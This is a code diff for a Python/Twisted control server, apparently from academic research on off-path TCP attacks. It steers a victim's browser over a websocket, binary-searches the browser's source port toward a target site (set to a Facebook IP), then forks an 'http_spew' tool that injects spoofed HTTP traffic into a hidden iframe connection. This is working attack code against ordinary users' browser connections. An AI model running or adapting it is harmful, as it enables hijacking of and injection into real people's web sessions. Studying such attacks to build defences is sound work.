@@ -42,13 +42,13 @@ HIGH_PORT = 61000
 
 PORT_BUCKET_SIZE = (HIGH_PORT - LOW_PORT) / NUM_BUCKETS
 TEST_VICTIM_IP = '12.168.1.113'
-#VICTIM_SITE = '69.171.242.11' # facebook (can only use on campus)
+VICTIM_SITE = '69.171.242.11' # facebook (can only use on campus)
 #VICTIM_SITE = '74.125.225.102' # google (can only use on campus)
 #VICTIM_SITE = '66.220.149.11'  # can't use non-umich because merit egress filters
 
 #VICTIM_SITE = '141.212.113.142' # sorry, cse.umich.edu
 
-VICTIM_SITE = '141.212.109.163' # can't use things with -m state --state ESTABLISHED,RELATED, because it will send RST to SYN-ACK
+#VICTIM_SITE = '141.212.109.163' # can't use things with -m state --state ESTABLISHED,RELATED, because it will send RST to SYN-ACK
 #VICTIM_SITE_IMG = 'http://%d-x-%d.x.hobocomp.com'
 
 
@@ -75,6 +75,7 @@ class ControlWebSocket(Protocol):
         self.calls = 0
         self.spewer_pid = None
         self.max_port = 0
+        self.seq_spew_port = None
         print 'control web from %s' % addr
 
     def spawnSpewer(self, low_port, high_port):
@@ -96,6 +97,22 @@ class ControlWebSocket(Protocol):
                                 '-t', SPEW_TIME_MS, '-d', self.SPEW_DELAY_US, self.addr.host, '%s:80' % (VICTIM_SITE)])
         #sys.exit(0)
 
+
+    def spawnHTTPSpewer(self):
+        if self.spewer_pid != None:
+            print 'Error: spewer already (still?) running! not starting HTTP'
+            reactor.stop()
+        
+        try:
+            self.spewer_pid = os.fork()
+            if self.spewer_pid > 0:
+                # parent
+                return
+        except OSError, e:
+            print 'Error: %s' % e.strerror
+        os.execvp('./http_spew', ['./http_spew', '-p', '%d' % (self.seq_spew_port), \
+                    '-r',  '0', '-d', str(int(self.SPEW_DELAY_US) / 2), self.addr.host, \
+                    '%s:80' % (VICTIM_SITE)])
 
     def getBucketPortRange(self):
         high = LOW_PORT + (self.bucket + 1) * self.PORT_BUCKET_SIZE - 1
@@ -124,6 +141,10 @@ class ControlWebSocket(Protocol):
 
 
 
+    def make_iframe(self):
+        self.transport.write('iframe')
+        self.spawnHTTPSpewer() 
+
     def adjustBucket(self, success):
         """
         Given the current bucket (self.min_port - self.mid_port), was the browser's source port in there?
@@ -145,7 +166,13 @@ class ControlWebSocket(Protocol):
                 port = self.max_port
             print 'Success!!! we did it! port: %d' % port
             self.transport.write("show <b>Used port %d</b>" % port) 
-            reactor.stop()
+            
+            self.transport.write("init_iframe http://%s/" % (VICTIM_SITE))
+                        
+            reactor.callLater(13.37, self.make_iframe)
+            self.seq_spew_port = port + 1
+
+            #reactor.stop()
             return
         else:
             print '(not equal)'
@@ -189,8 +216,9 @@ class ControlWebSocket(Protocol):
             self.mid_port = int((self.min_port + self.max_port) / 2)
         else:
             self.adjustBucket(True)
-        
-        reactor.callLater(NEW_CONNECTION_PERIOD, self.fireAgain)
+       
+        if (self.seq_spew_port == None): 
+            reactor.callLater(NEW_CONNECTION_PERIOD, self.fireAgain)
  
 
     def websocketTimeout(self):
@@ -299,7 +327,8 @@ class ControlWebSocket(Protocol):
             if (self.fire_time != None):
                 print 'diff: %f' % (time.time() - self.fire_time)
                 
-            reactor.callLater(NEW_CONNECTION_PERIOD, self.fireAgain)
+            if (self.seq_spew_port == None):
+                reactor.callLater(NEW_CONNECTION_PERIOD, self.fireAgain)
 
         elif data.startswith('calmed'):
             rtt_secs = float(data[len('calmed '):])
@@ -348,7 +377,7 @@ class ControlWebSocket(Protocol):
         self.bucket = 0
         
         # Tell that browser to open a connection to get rid of the "Chrome opens 5-50 connections
-        # for whatever the fuck reason when first asked, then calms the fuck down and only opens 1
+        # for whatever reason when first asked, then calms down and only opens 1
         # (or 2, you never know) to it next time.
         self.fire_time = time.time()
         self.transport.write("calm ws://%s/" % (VICTIM_SITE)) 
